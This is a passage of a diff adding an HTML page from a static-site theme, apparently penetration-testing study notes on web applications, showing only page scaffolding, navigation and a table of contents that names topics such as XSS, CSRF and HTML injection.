@@ -1,0 +1,1798 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.3.0, mkdocs-material-8.3.9">
+    
+    
+      
+        <title>Web Applications - PNPT</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.1d29e8d0.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.cbb835fc.min.css">
+        
+      
+      
+  
+  
+    
+    
+  
+    
+    
+  
+    
+    
+  
+    
+    
+  
+    
+    
+  
+    
+    
+  
+    
+    
+  
+    
+    
+  
+    
+    
+  
+    
+    
+  
+    
+    
+  
+    
+    
+  
+  
+  <style>:root{--md-admonition-icon--note:url('data:image/svg+xml;charset=utf-8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M2.5 7.775V2.75a.25.25 0 0 1 .25-.25h5.025a.25.25 0 0 1 .177.073l6.25 6.25a.25.25 0 0 1 0 .354l-5.025 5.025a.25.25 0 0 1-.354 0l-6.25-6.25a.25.25 0 0 1-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 0 1 0 2.474l-5.026 5.026a1.75 1.75 0 0 1-2.474 0l-6.25-6.25A1.75 1.75 0 0 1 1 7.775zM6 5a1 1 0 1 0 0 2 1 1 0 0 0 0-2z"/></svg>');--md-admonition-icon--abstract:url('data:image/svg+xml;charset=utf-8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M2.5 1.75a.25.25 0 0 1 .25-.25h8.5a.25.25 0 0 1 .25.25v7.736a.75.75 0 1 0 1.5 0V1.75A1.75 1.75 0 0 0 11.25 0h-8.5A1.75 1.75 0 0 0 1 1.75v11.5c0 .966.784 1.75 1.75 1.75h3.17a.75.75 0 0 0 0-1.5H2.75a.25.25 0 0 1-.25-.25V1.75zM4.75 4a.75.75 0 0 0 0 1.5h4.5a.75.75 0 0 0 0-1.5h-4.5zM4 7.75A.75.75 0 0 1 4.75 7h2a.75.75 0 0 1 0 1.5h-2A.75.75 0 0 1 4 7.75zm11.774 3.537a.75.75 0 0 0-1.048-1.074L10.7 14.145 9.281 12.72a.75.75 0 0 0-1.062 1.058l1.943 1.95a.75.75 0 0 0 1.055.008l4.557-4.45z"/></svg>');--md-admonition-icon--info:url('data:image/svg+xml;charset=utf-8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8 1.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13zM0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8zm6.5-.25A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75zM8 6a1 1 0 1 0 0-2 1 1 0 0 0 0 2z"/></svg>');--md-admonition-icon--tip:url('data:image/svg+xml;charset=utf-8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M3.499.75a.75.75 0 0 1 1.5 0v.996C5.9 2.903 6.793 3.65 7.662 4.376l.24.202c-.036-.694.055-1.422.426-2.163C9.1.873 10.794-.045 12.622.26 14.408.558 16 1.94 16 4.25c0 1.278-.954 2.575-2.44 2.734l.146.508.065.22c.203.701.412 1.455.476 2.226.142 1.707-.4 3.03-1.487 3.898C11.714 14.671 10.27 15 8.75 15h-6a.75.75 0 0 1 0-1.5h1.376a4.489 4.489 0 0 1-.563-1.191 3.833 3.833 0 0 1-.05-2.063 4.636 4.636 0 0 1-2.025-.293.75.75 0 1 1 .525-1.406c1.357.507 2.376-.006 2.698-.318l.009-.01a.748.748 0 0 1 1.06 0 .75.75 0 0 1-.012 1.074c-.912.92-.992 1.835-.768 2.586.221.74.745 1.337 1.196 1.621H8.75c1.343 0 2.398-.296 3.074-.836.635-.507 1.036-1.31.928-2.602-.05-.603-.216-1.224-.422-1.93l-.064-.221c-.12-.407-.246-.84-.353-1.29a2.404 2.404 0 0 1-.507-.441 3.063 3.063 0 0 1-.633-1.248.75.75 0 0 1 1.455-.364c.046.185.144.436.31.627.146.168.353.305.712.305.738 0 1.25-.615 1.25-1.25 0-1.47-.95-2.315-2.123-2.51-1.172-.196-2.227.387-2.706 1.345-.46.92-.27 1.774.019 3.062l.042.19a.753.753 0 0 1 .01.05c.348.443.666.949.94 1.553a.75.75 0 1 1-1.365.62c-.553-1.217-1.32-1.94-2.3-2.768a85.08 85.08 0 0 0-.317-.265c-.814-.68-1.75-1.462-2.692-2.619a3.74 3.74 0 0 0-1.023.88c-.406.495-.663 1.036-.722 1.508.116.122.306.21.591.239.388.038.797-.06 1.032-.19a.75.75 0 0 1 .728 1.31c-.515.287-1.23.439-1.906.373-.682-.067-1.473-.38-1.879-1.193L.75 5.677V5.5c0-.984.48-1.94 1.077-2.664.46-.559 1.05-1.055 1.673-1.353V.75z"/></svg>');--md-admonition-icon--success:url('data:image/svg+xml;charset=utf-8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>');--md-admonition-icon--question:url('data:image/svg+xml;charset=utf-8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8 1.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13zM0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8zm9 3a1 1 0 1 1-2 0 1 1 0 0 1 2 0zM6.92 6.085c.081-.16.19-.299.34-.398.145-.097.371-.187.74-.187.28 0 .553.087.738.225A.613.613 0 0 1 9 6.25c0 .177-.04.264-.077.318a.956.956 0 0 1-.277.245c-.076.051-.158.1-.258.161l-.007.004a7.728 7.728 0 0 0-.313.195 2.416 2.416 0 0 0-.692.661.75.75 0 0 0 1.248.832.956.956 0 0 1 .276-.245 6.3 6.3 0 0 1 .26-.16l.006-.004c.093-.057.204-.123.313-.195.222-.149.487-.355.692-.662.214-.32.329-.702.329-1.15 0-.76-.36-1.348-.863-1.725A2.76 2.76 0 0 0 8 4c-.631 0-1.155.16-1.572.438-.413.276-.68.638-.849.977a.75.75 0 1 0 1.342.67z"/></svg>');--md-admonition-icon--warning:url('data:image/svg+xml;charset=utf-8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.22 1.754a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368L8.22 1.754zm-1.763-.707c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575L6.457 1.047zM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0zm-.25-5.25a.75.75 0 0 0-1.5 0v2.5a.75.75 0 0 0 1.5 0v-2.5z"/></svg>');--md-admonition-icon--failure:url('data:image/svg+xml;charset=utf-8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M3.404 12.596a6.5 6.5 0 1 1 9.192-9.192 6.5 6.5 0 0 1-9.192 9.192zM2.344 2.343a8 8 0 1 0 11.313 11.314A8 8 0 0 0 2.343 2.343zM6.03 4.97a.75.75 0 0 0-1.06 1.06L6.94 8 4.97 9.97a.75.75 0 1 0 1.06 1.06L8 9.06l1.97 1.97a.75.75 0 1 0 1.06-1.06L9.06 8l1.97-1.97a.75.75 0 1 0-1.06-1.06L8 6.94 6.03 4.97z"/></svg>');--md-admonition-icon--danger:url('data:image/svg+xml;charset=utf-8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M10.561 1.5a.016.016 0 0 0-.01.004L3.286 8.571A.25.25 0 0 0 3.462 9H6.75a.75.75 0 0 1 .694 1.034l-1.713 4.188 6.982-6.793A.25.25 0 0 0 12.538 7H9.25a.75.75 0 0 1-.683-1.06l2.008-4.418.003-.006a.02.02 0 0 0-.004-.009.02.02 0 0 0-.006-.006L10.56 1.5zM9.504.43a1.516 1.516 0 0 1 2.437 1.713L10.415 5.5h2.123c1.57 0 2.346 1.909 1.22 3.004l-7.34 7.142a1.25 1.25 0 0 1-.871.354h-.302a1.25 1.25 0 0 1-1.157-1.723L5.633 10.5H3.462c-1.57 0-2.346-1.909-1.22-3.004L9.503.429z"/></svg>');--md-admonition-icon--bug:url('data:image/svg+xml;charset=utf-8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4.72.22a.75.75 0 0 1 1.06 0l1 .999a3.492 3.492 0 0 1 2.441 0l.999-1a.75.75 0 1 1 1.06 1.061l-.775.776c.616.63.995 1.493.995 2.444v.327c0 .1-.009.197-.025.292.408.14.764.392 1.029.722l1.968-.787a.75.75 0 0 1 .556 1.392L13 7.258V9h2.25a.75.75 0 0 1 0 1.5H13v.5c0 .409-.049.806-.141 1.186l2.17.868a.75.75 0 0 1-.557 1.392l-2.184-.873A4.997 4.997 0 0 1 8 16a4.997 4.997 0 0 1-4.288-2.427l-2.183.873a.75.75 0 0 1-.558-1.392l2.17-.868A5.013 5.013 0 0 1 3 11v-.5H.75a.75.75 0 0 1 0-1.5H3V7.258L.971 6.446a.75.75 0 0 1 .558-1.392l1.967.787c.265-.33.62-.583 1.03-.722a1.684 1.684 0 0 1-.026-.292V4.5c0-.951.38-1.814.995-2.444L4.72 1.28a.75.75 0 0 1 0-1.06zM6.173 5h3.654A.173.173 0 0 0 10 4.827V4.5a2 2 0 1 0-4 0v.327c0 .096.077.173.173.173zM5.25 6.5a.75.75 0 0 0-.75.75V11a3.5 3.5 0 1 0 7 0V7.25a.75.75 0 0 0-.75-.75h-5.5z"/></svg>');--md-admonition-icon--example:url('data:image/svg+xml;charset=utf-8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M5 5.782V2.5h-.25a.75.75 0 0 1 0-1.5h6.5a.75.75 0 0 1 0 1.5H11v3.282l3.666 5.76C15.619 13.04 14.543 15 12.767 15H3.233c-1.776 0-2.852-1.96-1.899-3.458L5 5.782zM9.5 2.5h-3V6a.75.75 0 0 1-.117.403L4.73 9h6.54L9.617 6.403A.75.75 0 0 1 9.5 6V2.5zm-6.9 9.847L3.775 10.5h8.45l1.175 1.847a.75.75 0 0 1-.633 1.153H3.233a.75.75 0 0 1-.633-1.153z"/></svg>');--md-admonition-icon--quote:url('data:image/svg+xml;charset=utf-8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M1.75 2.5a.75.75 0 0 0 0 1.5h10.5a.75.75 0 0 0 0-1.5H1.75zm4 5a.75.75 0 0 0 0 1.5h8.5a.75.75 0 0 0 0-1.5h-8.5zm0 5a.75.75 0 0 0 0 1.5h8.5a.75.75 0 0 0 0-1.5h-8.5zM2.5 7.75a.75.75 0 0 0-1.5 0v6a.75.75 0 0 0 1.5 0v-6z"/></svg>');}</style>
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#web-applications-vs-websites" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="PNPT" class="md-header__button md-logo" aria-label="PNPT" data-md-component="logo">
+      
+  <img src="../assets/bb.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            PNPT
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Web Applications
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <form class="md-header__option" data-md-component="palette">
+        
+          
+          
+          <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+          
+            <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+            </label>
+          
+        
+          
+          
+          <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="deep-purple"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+          
+            <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"/></svg>
+            </label>
+          
+        
+      </form>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href=".." class="md-tabs__link">
+      PNPT Live
+    </a>
+  </li>
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../networking/" class="md-tabs__link">
+        Networking Refresher
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../bash/" class="md-tabs__link">
+        Bash
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../python/" class="md-tabs__link">
+        Python
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../5/" class="md-tabs__link">
+      5-stages
+    </a>
+  </li>
+
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../en/" class="md-tabs__link">
+      Scaninng & Enumeration
+    </a>
+  </li>
+
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../exp/" class="md-tabs__link">
+      Exploitation Basics
+    </a>
+  </li>
+
+      
+        
+  
+  
+    
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../bb/" class="md-tabs__link md-tabs__link--active">
+        Boug Bounty
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="PNPT" class="md-nav__button md-logo" aria-label="PNPT" data-md-component="logo">
+      
+  <img src="../assets/bb.png" alt="logo">
+
+    </a>
+    PNPT
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        PNPT Live
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Networking Refresher
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Networking Refresher" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Networking Refresher
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../networking/" class="md-nav__link">
+        Linux & Networking
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../subneting/" class="md-nav__link">
+        Subneting
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../linux101/" class="md-nav__link">
+        Linux 101 Stuff
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          Bash
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Bash" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Bash
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bash/" class="md-nav__link">
+        Bash
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4">
+          Python
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Python" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          Python
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../python/" class="md-nav__link">
+        Intro-To-Python
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../5/" class="md-nav__link">
+        5-stages
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../en/" class="md-nav__link">
+        Scaninng & Enumeration
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../exp/" class="md-nav__link">
+        Exploitation Basics
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8" type="checkbox" id="__nav_8" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8">
+          Boug Bounty
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Boug Bounty" data-md-level="1">
+        <label class="md-nav__title" for="__nav_8">
+          <span class="md-nav__icon md-icon"></span>
+          Boug Bounty
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bb/" class="md-nav__link">
+        Bounty101
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Web Applications
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Web Applications
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#web-applications-vs-websites" class="md-nav__link">
+    Web Applications vs. Websites
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-application-distribution" class="md-nav__link">
+    Web Application Distribution
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#security-risks-of-web-applications" class="md-nav__link">
+    Security Risks of Web Applications
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-application-layout" class="md-nav__link">
+    Web Application Layout
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-application-infrastructure" class="md-nav__link">
+    Web Application Infrastructure
+  </a>
+  
+    <nav class="md-nav" aria-label="Web Application Infrastructure">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#client-server" class="md-nav__link">
+    Client-Server
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#one-server" class="md-nav__link">
+    One Server
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#many-servers-one-database" class="md-nav__link">
+    Many Servers - One Database
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#many-servers-many-databases" class="md-nav__link">
+    Many Servers - Many Databases
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#web-application-component" class="md-nav__link">
+    Web Application Component
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#web-application-architecture" class="md-nav__link">
+    Web Application Architecture
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#microservices" class="md-nav__link">
+    Microservices
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#serverless" class="md-nav__link">
+    Serverless
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#front-end-vs-back-end" class="md-nav__link">
+    Front End vs. Back End
+  </a>
+  
+    <nav class="md-nav" aria-label="Front End vs. Back End">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#front-end" class="md-nav__link">
+    Front End
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#back-end" class="md-nav__link">
+    Back End
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#securing-frontback-end" class="md-nav__link">
+    Securing Front/Back End
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sensitive-data-exposure" class="md-nav__link">
+    Sensitive Data Exposure
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#html-injection" class="md-nav__link">
+    HTML Injection
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cross-site-scripting-xss" class="md-nav__link">
+    Cross-Site Scripting (XSS)
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cross-site-request-forgery-csrf" class="md-nav__link">
+    Cross-Site Request Forgery (CSRF)
+  </a>
+  
+    <nav class="md-nav" aria-label="Cross-Site Request Forgery (CSRF)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#prevention" class="md-nav__link">
+    Prevention
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#back-end-servers" class="md-nav__link">
+    Back End Servers
+  </a>
+  
+    <nav class="md-nav" aria-label="Back End Servers">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#software" class="md-nav__link">
+    Software
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#web-servers" class="md-nav__link">
+    Web Servers
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#workflow" class="md-nav__link">
+    Workflow
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#databases" class="md-nav__link">
+    Databases
+  </a>
+  
+    <nav class="md-nav" aria-label="Databases">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#relational-sql" class="md-nav__link">
+    Relational (SQL)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#non-relational-nosql" class="md-nav__link">
+    Non-relational (NoSQL)
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#development-frameworks-apis" class="md-nav__link">
+    Development Frameworks &amp; APIs
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-apis" class="md-nav__link">
+    Web APIs
+  </a>
+  
+    <nav class="md-nav" aria-label="Web APIs">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#soap" class="md-nav__link">
+    SOAP
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rest" class="md-nav__link">
